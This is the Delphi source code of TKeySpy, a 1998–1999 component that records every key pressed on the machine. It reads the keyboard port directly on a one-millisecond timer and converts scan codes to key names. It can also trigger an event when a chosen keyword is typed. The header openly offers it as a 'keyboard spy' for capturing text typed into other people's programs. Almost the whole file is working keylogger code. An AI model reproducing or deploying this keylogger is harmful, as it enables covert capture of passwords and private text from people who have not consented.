{*************************************************************}
{            TKeySpy Component for Delphi 16/32               }
{ Version:   1.01                                             }
{ Author:    Aleksey Kuznetsov, Kiev, Ukraine                 }
{            Алексей Кузнецов (Xacker), Киев, Украина         }
{ E-Mail:    xacker@phreaker.net                              }
{ Created:   August, 16, 1998                                 }
{ Modified:  January, 20, 1999                                }
{ Legal:     Copyright (c) 1999 by Xacker from Droids Clan    }
{*************************************************************}
{                     KEYBOARD SPY:                           }
{ This component is intended for interception of pressing the }
{ keyboard. The KeySpy is possible to apply for interception  }
{ of the typed text of the another's programs, as keyboard    }
{ spy, or for processing events at type certain keywords etc..}
{*************************************************************}
{                 KEYBOARD SPY (Russian):                     }
{ Данная компонента предназначена для перехвата нажатий       }
{ клавиатуры. KeySpy можно применять для перехвата            }
{ набираемого текста чужих программ, как клавиатурный шпион,  }
{ или для выполнения какого-либо действия при наборе          }
{ определённого ключевого слова (Keyword) и т.д.              }
{*************************************************************}
{ Properties: ************************************************}
{         Enabled: As it usual...                             }
{         Keyword: At a set of this word event will be        }
{                  carried out (See OnKeyword event).         }
{     Events: ************************************************}
{    OnKeySpyDown: As OnKeyDown, but in any place (window).   }
{      OnKeySpyUp: As OnKeyUp, but in any place (window).     }
{       OnKeyword: The Keyword has been typed (See Keyword).  }
{*************************************************************}
{                    IMPORTANT NOTE:                          }
{  This code may be used and modified by anyone so long as    }
{ this header and copyright information remains intact. By    }
{ using this code you agree to indemnify Aleksey Xacker from  }
{ any liability that might arise from its use. You must       }
{ obtain written consent before selling or redistributing     }
{ this code.                                                  }
{                                                             }
{ If at occurrence of any questions concerning these          }
{ component, drop me mail: xacker@phreaker.net.               }
{*************************************************************}
{  Changes:                                                   }
{ 20.I.1999: Added 32-bit support                             }
{*************************************************************}

unit Keyspy;

interface

uses
  {$IFDEF WIN32} Windows, {$ELSE} WinTypes, WinProcs,{$ENDIF}
  SysUtils, Controls, Classes, Messages, Forms;

type
  TOnKeySpy = procedure(Sender: TObject; Key: Byte; KeyStr: String) of object;
  TKeySpy = class(TComponent)
  private
    FWindowHandle: HWnd;
    FOnKeySpyDown, FOnKeySpyUp: TOnKeySpy;
    FOnKeyword: TNotifyEvent;
    FEnabled: Boolean;
    FKeyword,
    KeyComp: String;

    OldKey: Byte;
    LShiftUp, RShiftUp: Boolean;
    procedure UpdateTimer;
    procedure SetEnabled(Value: Boolean);
    procedure WndProc(var Msg: TMessage);
  protected
    procedure KeySpy; dynamic;
  public
    constructor Create(AOwner: TComponent); override;
    destructor Destroy; override;
  published
    property Enabled: Boolean read FEnabled write SetEnabled;
    property Keyword: String read FKeyword write FKeyword;
    property OnKeySpyDown: TOnKeySpy read FOnKeySpyDown write FOnKeySpyDown;
    property OnKeySpyUp: TOnKeySpy read FOnKeySpyUp write FOnKeySpyUp;
    property OnKeyword: TNotifyEvent read FOnKeyword write FOnKeyword;
  end;

procedure Register;

implementation

const
  LowButtonName: Array[1..88] of PChar = ('--Esc','1','2','3','4','5','6','7','8','9',
                                          '0','-','=','--BkSp','--Tab','q','w','e','r','t',
                                          'y','u','i','o','p','[',']','--Enter','--Ctrl','a',
                                          's','d','f','g','h','j','k','l',';','''','`',
                                          '--LShift Down','\','z','x','c','v','b','n','m',',',
                                          '.','/','--RShift Down','--Gray*','--Alt','--Space',
                                          '--CapsLock','--F1','--F2','--F3','--F4','--F5',
                                          '--F6','--F7','--F8','--F9','--F10',
                                          '--NumLock','--ScrollLock','--Home','--Up',
                                          '--PgUp','--Gray-','--Left','--*5*','--Right',
                                          '--Gray+','--End','--Down','--PgDown','--Ins',
                                          '--Del','--LShift Up','--RShift Up',
                                          '--Unknown','--F11','--F12');

  HiButtonName: Array[1..88] of PChar = ('--Esc','!','@','#','$','%','^','&','*','(',
                                         ')','_','+','--BkSp','--Tab','Q','W','E','R','T',
                                         'Y','U','I','O','P','{','}','--Enter','--Ctrl','A',
                                         'S','D','F','G','H','J','K','L',':','"','~',
                                         '--LShift Down','|','Z','X','C','V','B','N','M','<',
                                         '>','?','--RShift Down','--Gray*','--Alt','--Space',
                                         '--CapsLock','--F1','--F2','--F3','--F4','--F5',
                                         '--F6','--F7','--F8','--F9','--F10',
                                         '--NumLock','--ScrollLock','--Home','--Up',
                                         '--PgUp','--Gray-','--Left','--*5*','--Right',
                                         '--Gray+','--End','--Down','--PgDown','--Ins',
                                         '--Del','--LShift Up','--RShift Up',
                                         '--Unknown','--F11','--F12');

constructor TKeySpy.Create(AOwner: TComponent);
begin
  inherited Create(AOwner);
  LShiftUp := True;
  RShiftUp := True;
  FEnabled := True;
  FWindowHandle := AllocateHWnd(WndProc);
  if FEnabled then UpdateTimer;
end;

destructor TKeySpy.Destroy;
begin
  FEnabled := False;
  UpdateTimer;
  DeallocateHWnd(FWindowHandle);
  inherited Destroy;
end;

procedure TKeySpy.WndProc(var Msg: TMessage);
begin
  with Msg do
    if Msg = WM_TIMER then
      try
        KeySpy;
      except
        Application.HandleException(Self);
      end
    else
      Result := DefWindowProc(FWindowHandle, Msg, wParam, lParam);
end;

procedure TKeySpy.UpdateTimer;
var
  b: Byte;
begin
  KillTimer(FWindowHandle, 1);
  if FEnabled then
   begin
    asm
      mov al, 60h
      mov b, al
    end;
    OldKey := b;
    if SetTimer(FWindowHandle, 1, 1, nil) = 0 then
      raise EOutOfResources.Create('No timers');
   end;
end;

procedure TKeySpy.SetEnabled(Value: Boolean);
begin
  if Value <> FEnabled then
  begin
    FEnabled := Value;
    UpdateTimer;
  end;
end;

procedure TKeySpy.KeySpy;
var
  Key: Byte;
  St: String;
  KS: TKeyboardState;
  NumLock : Boolean;
begin
  asm
    in al, 60h
    mov Key, al
  end;
  if Key = 170 then
   begin
    Key := 84;
    LShiftUp := True;
   end;
  if Key = 182 then
   begin
    Key := 85;
    RShiftUp := True;
   end;
  if Key = 42 then LShiftUp := False;
  if Key = 54 then RShiftUp := False;
  if Key <> OldKey then
   begin

    GetKeyboardState(KS);
    NumLock := Odd(KS[VK_NUMLOCK]);

    if NumLock then
       begin
         if Key = 71 then  // 7
            Key := 8
         else if Key = 72 then // 8
            Key := 9
         else if Key = 73 then  // 9
            Key := 10
         else if Key = 74 then // 4
            Key := 5
         else if Key = 76 then // 5
            Key := 6
         else if Key = 77 then // 6
            Key := 7
         else if Key = 79 then // 1
            Key := 2
         else if Key = 80 then // 2
            Key := 3
         else if Key = 81 then // 3
            Key := 4
         else if Key = 82 then // 0
            Key := 11
         else if Key = 83 then //.
            Key := 52;
       end;

    OldKey := Key;
    if Key <= 88 then
     if Assigned(FOnKeySpyDown) then
      begin
       if LShiftUp and RShiftUp then
        St := StrPas(LowButtonName[Key])
       else
        St := StrPas(HiButtonName[Key]);

       FOnKeySpyDown(Self, Key, St);

       KeyComp := KeyComp + St;
       if Length(KeyComp) > Length(FKeyword) then
        begin
         Move(KeyComp[Length(St) + 1], KeyComp[1], Length(KeyComp));
         {$IFDEF WIN32}
         SetLength(KeyComp, Length(FKeyword));
         {$ELSE}
         KeyComp[0] := char(Length(FKeyword));
         {$ENDIF}
        end;

      if KeyComp = FKeyword then FOnKeyword(Self);
      end
     else
    else
     if Assigned(FOnKeySpyUp) and (Key - 128 <= 88) then
      begin
       if LShiftUp and RShiftUp then
        St := StrPas(LowButtonName[Key - 128])
       else
        St := StrPas(HiButtonName[Key - 128]);
       FOnKeySpyUp(Self, Key, St)
      end;
   end;
end;

procedure Register;
begin
  RegisterComponents('Domani', [TKeySpy]);
end;

end.

